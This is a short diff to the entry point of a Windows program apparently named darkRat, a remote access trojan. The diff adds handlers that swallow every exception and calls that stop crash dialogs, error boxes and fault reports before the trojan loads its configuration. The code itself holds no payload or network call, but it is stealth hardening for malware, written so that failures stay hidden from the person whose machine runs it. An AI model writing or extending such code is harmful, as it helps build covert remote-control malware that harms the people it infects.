@@ -35,6 +35,24 @@
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib,"wbemuuid")
 
+void suppress_crash_handlers(void);
+long WINAPI unhandled_exception_handler(EXCEPTION_POINTERS* p_exceptions)
+{
+	// Suppress C4100 Warnings unused parameters required to match the 
+	// function signature of the API call.
+	(void*)p_exceptions;
+
+	// Throw any and all exceptions to the ground.
+	return EXCEPTION_EXECUTE_HANDLER;
+}
+extern "C" void handleErrors(int signal_number)
+{
+	/*Your code goes here. You can output debugging info.
+	  If you return from this function, and it was called
+	  because abort() was called, your program will exit or crash anyway
+	  (with a dialog box on Windows).
+	 */
+}
 
 
 #if _DEBUG
@@ -46,7 +64,10 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
 		int iCmdShow){
 #endif
-		darkRat::config::config config = darkRat::config::load();
+	SetUnhandledExceptionFilter(unhandled_exception_handler);
+	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
+	_set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
+	darkRat::config::config config = darkRat::config::load();
 		//Config config;
 		std::thread darkMain;
 
